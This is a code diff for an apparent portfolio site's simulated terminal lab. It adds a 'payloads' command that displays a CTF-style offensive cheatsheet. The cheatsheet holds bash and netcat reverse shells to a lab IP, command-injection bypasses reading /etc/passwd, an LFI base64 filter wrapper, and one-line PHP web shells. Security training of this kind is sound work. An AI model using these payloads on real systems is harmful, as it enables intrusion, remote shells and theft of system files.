@@ -36,9 +36,10 @@
   // 1. DATASET FOR COMMAND PALETTE SEARCH
   // =========================================================================
   const SEARCH_ITEMS = [
-    // Practice Lab
+    // Practice Lab & Cheatsheets
     { title: 'Interactive Terminal Lab', type: 'SANDBOX', url: root + 'terminal-lab.html', desc: 'Interactive Linux & cybersecurity tools learning simulator with simulated outputs', keywords: 'terminal lab linux sandbox practice nmap hydra gobuster sqlmap metasploit fake outputs learn practice' },
     { title: 'Cybersecurity Learning Roadmap', type: 'SANDBOX', url: root + 'terminal-lab.html#roadmap', desc: 'Guided 6-stage penetration testing methodology from host inspection to root privilege escalation', keywords: 'roadmap methodology pentesting stages curriculum progress nmap privesc' },
+    { title: 'Offensive Payloads Cheatsheet', type: 'SANDBOX', url: root + 'payloads.html', desc: 'TryHackMe-style cheatsheet for RCE, CMDi filter bypasses, LFI wrappers & reverse shells', keywords: 'payloads rce lfi cmdi command injection reverse shell bash php netcat bypass cheatsheet tryhackme' },
 
     // Case Studies
     { title: 'OpenCode Persistent Memory', type: 'CASE STUDY', url: root + 'projects/opencode-persistent-memory.html', desc: 'SQLite-authoritative local persistent memory & dual-engine retrieval for OpenCode', keywords: 'memory opencode sqlite chroma ollama local ai gemma nomic vector source verified' },
@@ -315,6 +316,48 @@ HOME_URL="https://www.kali.org/"`
         // =====================================================================
         // GUIDED LEARNING & CHEATSHEETS
         // =====================================================================
+        case 'payloads':
+        case 'payload':
+        case 'rce':
+        case 'lfi':
+        case 'revshell': {
+          return `
+            <div class="p-3 rounded bg-canvas-base border border-danger-critical/40 space-y-2 text-xs">
+              <div class="text-danger-critical font-bold flex items-center justify-between">
+                <span class="flex items-center gap-1.5">
+                  <span class="material-symbols-outlined text-sm">security</span>
+                  <span>OFFENSIVE SECURITY PAYLOADS &amp; BYPASS CHEATSHEET</span>
+                </span>
+                <a href="${root}payloads.html" class="px-2 py-0.5 rounded bg-danger-critical/20 text-danger-critical hover:bg-danger-critical hover:text-canvas-base text-[10px] font-bold transition-all">OPEN FULL HUB ↗</a>
+              </div>
+              <div class="text-outline text-[11px]">Instant TryHackMe &amp; CTF-style exploitation payloads:</div>
+              <div class="space-y-1.5 text-[11px] font-mono">
+                <div class="p-2 rounded bg-surface-raised border border-border-hairline">
+                  <span class="text-primary font-bold">Bash TCP Reverse Shell:</span><br/>
+                  <code class="text-on-surface select-all">bash -i &gt;&amp; /dev/tcp/10.10.14.23/4444 0&gt;&amp;1</code>
+                </div>
+                <div class="p-2 rounded bg-surface-raised border border-border-hairline">
+                  <span class="text-secondary font-bold">Netcat OpenBSD FIFO (No -e):</span><br/>
+                  <code class="text-on-surface select-all">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.23 4444 &gt;/tmp/f</code>
+                </div>
+                <div class="p-2 rounded bg-surface-raised border border-border-hairline">
+                  <span class="text-warning font-bold">Command Injection Space Bypass (\${IFS}):</span><br/>
+                  <code class="text-on-surface select-all">cat\${IFS}/etc/passwd</code> · <code class="text-on-surface select-all">{cat,/etc/passwd}</code>
+                </div>
+                <div class="p-2 rounded bg-surface-raised border border-border-hairline">
+                  <span class="text-primary font-bold">LFI Source Code Disclosure Filter:</span><br/>
+                  <code class="text-on-surface select-all">php://filter/convert.base64-encode/resource=index.php</code>
+                </div>
+                <div class="p-2 rounded bg-surface-raised border border-border-hairline">
+                  <span class="text-danger-critical font-bold">Minimal PHP Web Shell:</span><br/>
+                  <code class="text-on-surface select-all">&lt;?php system(\$_GET['cmd']); ?&gt;</code> · <code class="text-on-surface select-all">&lt;?=\`\$_GET[0]\`;</code>
+                </div>
+              </div>
+              <div class="text-outline text-[10px]">Tip: Visit <a href="${root}payloads.html" class="text-danger-critical underline font-bold">payloads.html</a> for the interactive generator with dynamic LHOST/LPORT replacement!</div>
+            </div>
+          `;
+        }
+
         case 'roadmap':
         case 'methodology':
         case 'stages': {
@@ -1244,6 +1287,7 @@ PORT      STATE SERVICE
             <div class="space-y-2 text-xs">
               <div class="text-outline font-bold">Available Sandbox Commands:</div>
               <div class="grid grid-cols-2 sm:grid-cols-3 gap-2 text-on-surface font-mono text-[11px]">
+                <div><span class="text-danger-critical font-bold">payloads</span> - RCE, CMDi &amp; LFI cheatsheet</div>
                 <div><span class="text-primary font-bold">roadmap</span> - 6-stage guided methodology</div>
                 <div><span class="text-primary font-bold">learn</span> - Interactive training modules</div>
                 <div><span class="text-secondary font-bold">targets</span> - Scoped lab machines</div>
@@ -1551,7 +1595,7 @@ PORT      STATE SERVICE
     let matrixCanvas = null;
 
     const AUTOCOMPLETE_COMMANDS = [
-      'help', 'roadmap', 'learn', 'targets', 'cheatsheet', 'whoami', 'skills', 'projects', 'tryhackme', 'cat resume',
+      'help', 'payloads', 'rce', 'lfi', 'revshell', 'roadmap', 'learn', 'targets', 'cheatsheet', 'whoami', 'skills', 'projects', 'tryhackme', 'cat resume',
       'ls', 'pwd', 'cd', 'cat', 'grep', 'find', 'chmod', 'ps', 'uname', 'ifconfig', 'df', 'free', 'history',
       'nmap', 'gobuster', 'ffuf', 'hydra', 'hashcat', 'john', 'sqlmap', 'nc', 'searchsploit', 'msfconsole',
       'matrix', 'theme', 'uptime', 'date', 'sudo', 'echo', 'clear', 'exit'
